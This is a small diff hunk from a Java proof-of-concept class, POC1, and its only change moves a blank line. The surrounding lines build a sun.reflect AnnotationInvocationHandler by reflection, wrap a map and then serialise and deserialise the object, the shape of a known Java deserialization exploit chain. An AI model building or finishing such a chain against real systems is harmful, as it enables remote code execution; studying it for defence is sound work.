@@ -45,8 +45,8 @@ public class POC1 {
         Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
         constructor.setAccessible(true);
-
         Object obj = constructor.newInstance(Retention.class,outerMap);
+
         Serialization(obj);
         Unserialization();
     }
